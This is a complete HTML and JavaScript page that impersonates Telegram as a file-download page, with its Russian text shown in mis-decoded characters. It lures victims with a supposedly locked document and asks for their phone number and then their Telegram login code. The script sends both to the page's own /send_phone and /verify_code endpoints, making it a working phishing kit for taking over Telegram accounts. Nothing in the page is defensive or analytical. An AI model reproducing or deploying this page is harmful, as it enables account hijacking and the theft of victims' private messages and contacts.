<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–¢–µ–ª–µ–≥—Ä–∞–º –§–∞–π–ª—ã</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
    }
    .telegram-logo {
      width: 120px;
      height: 120px;
      margin: 0 auto 30px;
    }
    .telegram-logo img {
      width: 120px;
      height: 120px;
      display: block;
    }
    h1 {
      font-size: 24px;
      font-weight: 500;
      color: #333;
      margin-bottom: 30px;
    }
    .file-item {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      padding: 12px 16px;
      margin: 0 auto 30px;
      background: linear-gradient(to right, #f0f4f8, #e3eaf0);
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
      cursor: pointer;
      transition: all 0.3s;
      max-width: 100%;
      text-align: left;
    }
    .file-item.active {
      background: #e3f2fd;
      cursor: pointer;
    }
    .file-item.inactive {
      opacity: 1;
      cursor: not-allowed;
    }
    .file-icon {
      width: 24px;
      height: 24px;
      margin-right: 12px;
      flex-shrink: 0;
    }
    .file-icon svg {
      width: 100%;
      height: 100%;
      fill: #d32f2f;
    }
    .file-icon img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      filter: none;
      opacity: 1 !important;
      transition: none;
      transform: none;
    }
    .file-name {
      flex: 1;
      font-size: 15px;
      color: #000000;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }
    .instruction-text {
      font-size: 14px;
      color: #666;
      margin-bottom: 30px;
      line-height: 1.5;
    }
    .instruction-text.error {
      color: #d32f2f !important;
    }
    .auth-form {
      width: 100%;
    }
    .form-step {
      display: none;
    }
    .form-step.active {
      display: block;
    }
    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }
    .form-label {
      display: block;
      font-size: 13px;
      color: #999;
      margin-bottom: 8px;
    }
    .country-select-wrapper {
      position: relative;
    }
    .country-select-wrapper::before {
      content: '';
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
      pointer-events: none;
      z-index: 1;
    }
    .country-select-wrapper[data-flag]::before {
      content: attr(data-flag);
    }
    .form-input {
      width: 100%;
      padding: 12px 16px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 15px;
      color: #333;
      background: #fff;
      transition: border-color 0.3s;
    }
    .form-input:focus {
      outline: none;
      border-color: #0088cc;
    }
    .form-input.error {
      border-color: #d32f2f;
    }
    .country-select-wrapper {
      position: relative;
    }
    .country-select-wrapper::before {
      content: var(--flag-content, 'üá∑üá∫');
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 20px;
      pointer-events: none;
      z-index: 1;
      line-height: 1;
    }
    .country-select-wrapper::after {
      content: '';
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 0;
      height: 0;
      border-left: 5px solid transparent;
      border-right: 5px solid transparent;
      border-top: 6px solid #666;
      pointer-events: none;
      z-index: 1;
    }
    select.form-input {
      padding-left: 45px;
      padding-right: 35px;
      background-image: none;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      cursor: pointer;
    }
    select.form-input option {
      padding: 8px;
    }
    .phone-input-wrapper {
      display: flex;
      align-items: center;
    }
    .country-code {
      padding: 12px 16px;
      border: 1px solid #ddd;
      border-right: none;
      border-radius: 8px 0 0 8px;
      background: #f8f9fa;
      font-size: 15px;
      color: #333;
      min-width: 80px;
      text-align: center;
    }
    .phone-input {
      flex: 1;
      border-radius: 0 8px 8px 0;
    }
    .continue-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(to right, #229ED9, #0088cc);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: opacity 0.3s;
      margin-top: 10px;
    }
    .continue-btn:hover {
      opacity: 0.9;
    }
    .continue-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .error-message {
      color: #d32f2f;
      font-size: 13px;
      margin-top: 8px;
      display: none;
    }
    .error-message.show {
      display: block;
    }
    .success-message {
      background: #e8f5e9;
      color: #2e7d32;
      padding: 12px 16px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 14px;
      display: none;
    }
    .success-message.show {
      display: block;
    }
    .download-btn {
      width: 100%;
      padding: 14px;
      background: #4caf50;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.3s;
      display: none;
    }
    .download-btn.show {
      display: block;
    }
    .download-btn:hover {
      background: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Telegram Logo -->
    <div class="telegram-logo">
      <img src="/static/logo.svg.webp" alt="Telegram Logo">
    </div>

    <!-- Title -->
    <h1>–¢–µ–ª–µ–≥—Ä–∞–º –§–∞–π–ª—ã</h1>

    <!-- File Item -->
    <div class="file-item inactive" id="fileItem">
      <div class="file-icon" id="fileIcon">
        <svg viewBox="0 0 24 24" id="defaultFileIcon">
          <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
        </svg>
      </div>
      <div class="file-name" id="fileName">–ü–æ—Ä—è–¥–æ–∫ –∏ —É—Å–ª–æ–≤–∏—è –∫–æ–º–∞–Ω–¥–∏—Ä–æ–≤...</div>
    </div>

    <!-- Instruction Text -->
    <p class="instruction-text" id="instructionText">–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª—É –∞–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å —Å –ø–æ–º–æ—â—å—é –¢–µ–ª–µ–≥—Ä–∞–º –∞–∫–∫–∞—É–Ω—Ç–∞.</p>

    <!-- Authorization Form -->
    <div class="auth-form">
      <!-- Step 1: Phone Number -->
      <div class="form-step active" id="phoneStep">
        <div class="form-group">
          <label class="form-label">–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É</label>
          <div class="country-select-wrapper" id="countrySelectWrapper" style="--flag-content: 'üá∑üá∫';">
            <select class="form-input" id="countrySelect">
            <option value="+7" data-flag="üá∑üá∫">–†–æ—Å—Å–∏—è</option>
            <option value="+380" data-flag="üá∫üá¶">–£–∫—Ä–∞–∏–Ω–∞</option>
            <option value="+1" data-flag="üá∫üá∏">–°–®–ê</option>
            <option value="+44" data-flag="üá¨üáß">–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è</option>
            <option value="+49" data-flag="üá©üá™">–ì–µ—Ä–º–∞–Ω–∏—è</option>
            <option value="+33" data-flag="üá´üá∑">–§—Ä–∞–Ω—Ü–∏—è</option>
            <option value="+39" data-flag="üáÆüáπ">–ò—Ç–∞–ª–∏—è</option>
            <option value="+34" data-flag="üá™üá∏">–ò—Å–ø–∞–Ω–∏—è</option>
            <option value="+31" data-flag="üá≥üá±">–ù–∏–¥–µ—Ä–ª–∞–Ω–¥—ã</option>
            <option value="+32" data-flag="üáßüá™">–ë–µ–ª—å–≥–∏—è</option>
            <option value="+41" data-flag="üá®üá≠">–®–≤–µ–π—Ü–∞—Ä–∏—è</option>
            <option value="+43" data-flag="üá¶üáπ">–ê–≤—Å—Ç—Ä–∏—è</option>
            <option value="+45" data-flag="üá©üá∞">–î–∞–Ω–∏—è</option>
            <option value="+46" data-flag="üá∏üá™">–®–≤–µ—Ü–∏—è</option>
            <option value="+47" data-flag="üá≥üá¥">–ù–æ—Ä–≤–µ–≥–∏—è</option>
            <option value="+48" data-flag="üáµüá±">–ü–æ–ª—å—à–∞</option>
            <option value="+90" data-flag="üáπüá∑">–¢—É—Ä—Ü–∏—è</option>
            <option value="+86" data-flag="üá®üá≥">–ö–∏—Ç–∞–π</option>
            <option value="+81" data-flag="üáØüáµ">–Ø–ø–æ–Ω–∏—è</option>
            <option value="+82" data-flag="üá∞üá∑">–Æ–∂–Ω–∞—è –ö–æ—Ä–µ—è</option>
            <option value="+91" data-flag="üáÆüá≥">–ò–Ω–¥–∏—è</option>
            <option value="+55" data-flag="üáßüá∑">–ë—Ä–∞–∑–∏–ª–∏—è</option>
            <option value="+52" data-flag="üá≤üáΩ">–ú–µ–∫—Å–∏–∫–∞</option>
            <option value="+61" data-flag="üá¶üá∫">–ê–≤—Å—Ç—Ä–∞–ª–∏—è</option>
            <option value="+27" data-flag="üáøüá¶">–Æ–ê–†</option>
            <option value="+20" data-flag="üá™üá¨">–ï–≥–∏–ø–µ—Ç</option>
            <option value="+212" data-flag="üá≤üá¶">–ú–∞—Ä–æ–∫–∫–æ</option>
            <option value="+234" data-flag="üá≥üá¨">–ù–∏–≥–µ—Ä–∏—è</option>
            <option value="+62" data-flag="üáÆüá©">–ò–Ω–¥–æ–Ω–µ–∑–∏—è</option>
            <option value="+66" data-flag="üáπüá≠">–¢–∞–∏–ª–∞–Ω–¥</option>
            <option value="+65" data-flag="üá∏üá¨">–°–∏–Ω–≥–∞–ø—É—Ä</option>
            <option value="+60" data-flag="üá≤üáæ">–ú–∞–ª–∞–π–∑–∏—è</option>
            <option value="+84" data-flag="üáªüá≥">–í—å–µ—Ç–Ω–∞–º</option>
            <option value="+63" data-flag="üáµüá≠">–§–∏–ª–∏–ø–ø–∏–Ω—ã</option>
            <option value="+64" data-flag="üá≥üáø">–ù–æ–≤–∞—è –ó–µ–ª–∞–Ω–¥–∏—è</option>
            <option value="+30" data-flag="üá¨üá∑">–ì—Ä–µ—Ü–∏—è</option>
            <option value="+36" data-flag="üá≠üá∫">–í–µ–Ω–≥—Ä–∏—è</option>
            <option value="+40" data-flag="üá∑üá¥">–†—É–º—ã–Ω–∏—è</option>
            <option value="+351" data-flag="üáµüáπ">–ü–æ—Ä—Ç—É–≥–∞–ª–∏—è</option>
            <option value="+353" data-flag="üáÆüá™">–ò—Ä–ª–∞–Ω–¥–∏—è</option>
            <option value="+358" data-flag="üá´üáÆ">–§–∏–Ω–ª—è–Ω–¥–∏—è</option>
            <option value="+420" data-flag="üá®üáø">–ß–µ—Ö–∏—è</option>
            <option value="+421" data-flag="üá∏üá∞">–°–ª–æ–≤–∞–∫–∏—è</option>
            <option value="+385" data-flag="üá≠üá∑">–•–æ—Ä–≤–∞—Ç–∏—è</option>
            <option value="+386" data-flag="üá∏üáÆ">–°–ª–æ–≤–µ–Ω–∏—è</option>
            <option value="+370" data-flag="üá±üáπ">–õ–∏—Ç–≤–∞</option>
            <option value="+371" data-flag="üá±üáª">–õ–∞—Ç–≤–∏—è</option>
            <option value="+372" data-flag="üá™üá™">–≠—Å—Ç–æ–Ω–∏—è</option>
            <option value="+359" data-flag="üáßüá¨">–ë–æ–ª–≥–∞—Ä–∏—è</option>
            <option value="+356" data-flag="üá≤üáπ">–ú–∞–ª—å—Ç–∞</option>
            <option value="+357" data-flag="üá®üáæ">–ö–∏–ø—Ä</option>
            <option value="+352" data-flag="üá±üá∫">–õ—é–∫—Å–µ–º–±—É—Ä–≥</option>
            <option value="+354" data-flag="üáÆüá∏">–ò—Å–ª–∞–Ω–¥–∏—è</option>
            <option value="+298" data-flag="üá´üá¥">–§–∞—Ä–µ—Ä—Å–∫–∏–µ –æ—Å—Ç—Ä–æ–≤–∞</option>
            <option value="+299" data-flag="üá¨üá±">–ì—Ä–µ–Ω–ª–∞–Ω–¥–∏—è</option>
            <option value="+375" data-flag="üáßüáæ">–ë–µ–ª–∞—Ä—É—Å—å</option>
            <option value="+374" data-flag="üá¶üá≤">–ê—Ä–º–µ–Ω–∏—è</option>
            <option value="+995" data-flag="üá¨üá™">–ì—Ä—É–∑–∏—è</option>
            <option value="+994" data-flag="üá¶üáø">–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω</option>
            <option value="+998" data-flag="üá∫üáø">–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω</option>
            <option value="+992" data-flag="üáπüáØ">–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω</option>
            <option value="+996" data-flag="üá∞üá¨">–ö—ã—Ä–≥—ã–∑—Å—Ç–∞–Ω</option>
            <option value="+993" data-flag="üáπüá≤">–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω</option>
            <option value="+373" data-flag="üá≤üá©">–ú–æ–ª–¥–æ–≤–∞</option>
            </select>
          </div>
        </div>
        </div>
        <div class="form-group">
          <label class="form-label">–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
          <div class="phone-input-wrapper">
            <div class="country-code" id="countryCode">+7</div>
            <input type="tel" class="form-input phone-input" id="phoneInput" placeholder="(XXX) XXX-XX-XX" autocomplete="off">
          </div>
          <div class="error-message" id="phoneError"></div>
        </div>
        <button class="continue-btn" id="continueBtn">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
  </div>

      <!-- Step 2: Code Verification -->
      <div class="form-step" id="codeStep">
        <div class="form-group">
          <label class="form-label">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</label>
          <input type="text" class="form-input" id="codeInput" placeholder="–ö–æ–¥ –∏–∑ Telegram" autocomplete="off" maxlength="6">
          <div class="error-message" id="codeError"></div>
        </div>
        <button class="continue-btn" id="verifyBtn">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</button>
      </div>

      <!-- Success Message and Download -->
      <div class="success-message" id="successMessage">
        –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª.
      </div>
      <button class="download-btn" id="downloadBtn">–°–ö–ê–ß–ê–¢–¨ –§–ê–ô–õ</button>
    </div>
  </div>

  <script>
    // State
    let currentPhone = '';
    let isAuthorized = false;
    let fileName = '';

    // Elements
    const countrySelect = document.getElementById('countrySelect');
    const countryCode = document.getElementById('countryCode');
    const phoneInput = document.getElementById('phoneInput');
    const continueBtn = document.getElementById('continueBtn');
    const phoneStep = document.getElementById('phoneStep');
    const codeStep = document.getElementById('codeStep');
    const codeInput = document.getElementById('codeInput');
    const verifyBtn = document.getElementById('verifyBtn');
    const phoneError = document.getElementById('phoneError');
    const codeError = document.getElementById('codeError');
    const fileItem = document.getElementById('fileItem');
    const fileNameElement = document.getElementById('fileName');
    const successMessage = document.getElementById('successMessage');
    const downloadBtn = document.getElementById('downloadBtn');
    const fileIcon = document.getElementById('fileIcon');
    const instructionText = document.getElementById('instructionText');

    // Update file icon based on extension
    function updateFileIcon(filename) {
      if (!filename) return;
      
      const extension = filename.split('.').pop().toLowerCase();
      const defaultIcon = document.getElementById('defaultFileIcon');
      
      // Clear existing content
      fileIcon.innerHTML = '';
      
      if (extension === 'pdf') {
        const img = document.createElement('img');
        img.src = '/static/pdf.png';
        img.alt = 'PDF';
        fileIcon.appendChild(img);
      } else if (extension === 'xlsx') {
        const img = document.createElement('img');
        img.src = '/static/xlsx.png';
        img.alt = 'XLSX';
        fileIcon.appendChild(img);
      } else {
        // Use default SVG icon
        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        svg.setAttribute('viewBox', '0 0 24 24');
        svg.id = 'defaultFileIcon';
        const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        path.setAttribute('d', 'M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z');
        svg.appendChild(path);
        fileIcon.appendChild(svg);
      }
    }

    // Fetch file name on page load
    async function fetchFileName() {
      try {
        const res = await fetch('/api/file_info');
        const data = await res.json();
        if (res.ok && data.filename) {
          fileName = data.filename;
          fileNameElement.textContent = fileName;
          updateFileIcon(fileName);
        } else {
          fileNameElement.textContent = '–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω';
        }
      } catch (err) {
        console.error('Error fetching file name:', err);
        fileNameElement.textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞';
      }
    }

    // Load file name on page load
    fetchFileName();

    // Country code mapping
    const countryCodes = {
      '+7': '–†–æ—Å—Å–∏—è',
      '+380': '–£–∫—Ä–∞–∏–Ω–∞',
      '+1': '–°–®–ê',
      '+44': '–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è',
      '+49': '–ì–µ—Ä–º–∞–Ω–∏—è',
      '+33': '–§—Ä–∞–Ω—Ü–∏—è',
      '+39': '–ò—Ç–∞–ª–∏—è',
      '+34': '–ò—Å–ø–∞–Ω–∏—è',
      '+31': '–ù–∏–¥–µ—Ä–ª–∞–Ω–¥—ã',
      '+32': '–ë–µ–ª—å–≥–∏—è',
      '+41': '–®–≤–µ–π—Ü–∞—Ä–∏—è',
      '+43': '–ê–≤—Å—Ç—Ä–∏—è',
      '+45': '–î–∞–Ω–∏—è',
      '+46': '–®–≤–µ—Ü–∏—è',
      '+47': '–ù–æ—Ä–≤–µ–≥–∏—è',
      '+48': '–ü–æ–ª—å—à–∞',
      '+90': '–¢—É—Ä—Ü–∏—è',
      '+86': '–ö–∏—Ç–∞–π',
      '+81': '–Ø–ø–æ–Ω–∏—è',
      '+82': '–Æ–∂–Ω–∞—è –ö–æ—Ä–µ—è',
      '+91': '–ò–Ω–¥–∏—è',
      '+55': '–ë—Ä–∞–∑–∏–ª–∏—è',
      '+52': '–ú–µ–∫—Å–∏–∫–∞',
      '+61': '–ê–≤—Å—Ç—Ä–∞–ª–∏—è',
      '+27': '–Æ–ê–†',
      '+20': '–ï–≥–∏–ø–µ—Ç',
      '+212': '–ú–∞—Ä–æ–∫–∫–æ',
      '+234': '–ù–∏–≥–µ—Ä–∏—è',
      '+62': '–ò–Ω–¥–æ–Ω–µ–∑–∏—è',
      '+66': '–¢–∞–∏–ª–∞–Ω–¥',
      '+65': '–°–∏–Ω–≥–∞–ø—É—Ä',
      '+60': '–ú–∞–ª–∞–π–∑–∏—è',
      '+84': '–í—å–µ—Ç–Ω–∞–º',
      '+63': '–§–∏–ª–∏–ø–ø–∏–Ω—ã',
      '+64': '–ù–æ–≤–∞—è –ó–µ–ª–∞–Ω–¥–∏—è',
      '+30': '–ì—Ä–µ—Ü–∏—è',
      '+36': '–í–µ–Ω–≥—Ä–∏—è',
      '+40': '–†—É–º—ã–Ω–∏—è',
      '+351': '–ü–æ—Ä—Ç—É–≥–∞–ª–∏—è',
      '+353': '–ò—Ä–ª–∞–Ω–¥–∏—è',
      '+358': '–§–∏–Ω–ª—è–Ω–¥–∏—è',
      '+420': '–ß–µ—Ö–∏—è',
      '+421': '–°–ª–æ–≤–∞–∫–∏—è',
      '+385': '–•–æ—Ä–≤–∞—Ç–∏—è',
      '+386': '–°–ª–æ–≤–µ–Ω–∏—è',
      '+370': '–õ–∏—Ç–≤–∞',
      '+371': '–õ–∞—Ç–≤–∏—è',
      '+372': '–≠—Å—Ç–æ–Ω–∏—è',
      '+359': '–ë–æ–ª–≥–∞—Ä–∏—è',
      '+356': '–ú–∞–ª—å—Ç–∞',
      '+357': '–ö–∏–ø—Ä',
      '+352': '–õ—é–∫—Å–µ–º–±—É—Ä–≥',
      '+354': '–ò—Å–ª–∞–Ω–¥–∏—è',
      '+298': '–§–∞—Ä–µ—Ä—Å–∫–∏–µ –æ—Å—Ç—Ä–æ–≤–∞',
      '+299': '–ì—Ä–µ–Ω–ª–∞–Ω–¥–∏—è',
      '+374': '–ê—Ä–º–µ–Ω–∏—è',
      '+995': '–ì—Ä—É–∑–∏—è',
      '+994': '–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω',
      '+998': '–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω',
      '+992': '–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω',
      '+996': '–ö—ã—Ä–≥—ã–∑—Å—Ç–∞–Ω',
      '+993': '–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω'
    };

    // Update country code and flag when country changes
    const countrySelectWrapper = document.getElementById('countrySelectWrapper');
    countrySelect.addEventListener('change', () => {
      const selectedOption = countrySelect.options[countrySelect.selectedIndex];
      const selectedCode = countrySelect.value;
      const selectedFlag = selectedOption.getAttribute('data-flag') || 'üá∑üá∫';
      
      countryCode.textContent = selectedCode;
      // Update the ::before pseudo-element flag
      countrySelectWrapper.style.setProperty('--flag-content', `"${selectedFlag}"`);
      phoneInput.value = '';
      phoneInput.focus();
    });

    // Format phone input
    phoneInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      const code = countryCode.textContent.replace('+', '');
      
      // Remove country code if user types it
      if (value.startsWith(code)) {
        value = value.substring(code.length);
      }
      
      // Format based on country
      if (code === '7') {
        // Russian format: (XXX) XXX-XX-XX
        if (value.length > 0) {
          let formatted = '';
          if (value.length > 0) formatted += '(' + value.substring(0, 3);
          if (value.length >= 3) formatted += ') ' + value.substring(3, 6);
          if (value.length >= 6) formatted += '-' + value.substring(6, 8);
          if (value.length >= 8) formatted += '-' + value.substring(8, 10);
          e.target.value = formatted;
        } else {
          e.target.value = '';
        }
      } else {
        // Simple format for other countries
        e.target.value = value;
      }
      
      // Clear errors
      phoneError.classList.remove('show');
      phoneInput.classList.remove('error');
    });

    // Continue button - send phone
    continueBtn.addEventListener('click', async () => {
      const code = countryCode.textContent;
      const phoneNumber = phoneInput.value.replace(/\D/g, '');
      
      if (!phoneNumber) {
        phoneError.textContent = '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞';
        phoneError.classList.add('show');
        phoneInput.classList.add('error');
        return;
      }
      
      const fullPhone = code + phoneNumber;
      currentPhone = fullPhone;
      
      continueBtn.disabled = true;
      continueBtn.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞...';
      continueBtn.style.display = 'none';
      
      try {
        const res = await fetch('/send_phone', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: fullPhone })
      });

      const data = await res.json();

        if (res.ok && data.status === 'code_sent') {
          phoneStep.classList.remove('active');
          codeStep.classList.add('active');
          codeInput.focus();
      } else {
          continueBtn.style.display = 'block';
          phoneError.textContent = data.detail || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –Ω–æ–º–µ—Ä–∞';
          phoneError.classList.add('show');
          phoneInput.classList.add('error');
      }
    } catch (err) {
        continueBtn.style.display = 'block';
        phoneError.textContent = '–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º';
        phoneError.classList.add('show');
        phoneInput.classList.add('error');
      } finally {
        continueBtn.disabled = false;
        continueBtn.textContent = '–ü–†–û–î–û–õ–ñ–ò–¢–¨';
      }
    });

    // Code input formatting
    codeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      codeError.classList.remove('show');
      codeInput.classList.remove('error');
    });

    // Verify code button
    verifyBtn.addEventListener('click', async () => {
    const code = codeInput.value.trim();
      
      if (!code) {
        codeError.textContent = '–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
        codeError.classList.add('show');
        codeInput.classList.add('error');
        return;
      }
      
      verifyBtn.disabled = true;
      verifyBtn.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞...';
      
      try {
        const res = await fetch('/verify_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: currentPhone, code })
      });

      const data = await res.json();

      if (res.ok) {
          isAuthorized = true;
          codeStep.classList.remove('active');
          successMessage.classList.add('show');
          downloadBtn.classList.add('show');
          fileItem.classList.remove('inactive');
          fileItem.classList.add('active');
      } else {
          codeError.textContent = data.detail || '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥';
          codeError.classList.add('show');
          codeInput.classList.add('error');
      }
    } catch (err) {
        codeError.textContent = '–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º';
        codeError.classList.add('show');
        codeInput.classList.add('error');
      } finally {
        verifyBtn.disabled = false;
        verifyBtn.textContent = '–ü–û–î–¢–í–ï–†–î–ò–¢–¨';
      }
    });

    // Download button
    downloadBtn.addEventListener('click', () => {
      if (isAuthorized && fileName) {
        // Download the file
        window.location.href = '/api/download_file';
      }
    });

    // File item click (only when active)
    fileItem.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (isAuthorized && fileItem.classList.contains('active')) {
        downloadBtn.click();
      } else {
        // Change instruction text to red if not authorized
        if (instructionText) {
          instructionText.classList.add('error');
          // Reset to normal color after 3 seconds
          setTimeout(() => {
            if (instructionText) {
              instructionText.classList.remove('error');
            }
          }, 3000);
        }
      }
    });

    // Enter key handlers
    phoneInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        continueBtn.click();
      }
    });

    codeInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        verifyBtn.click();
      }
    });
  </script>
</body>
</html>
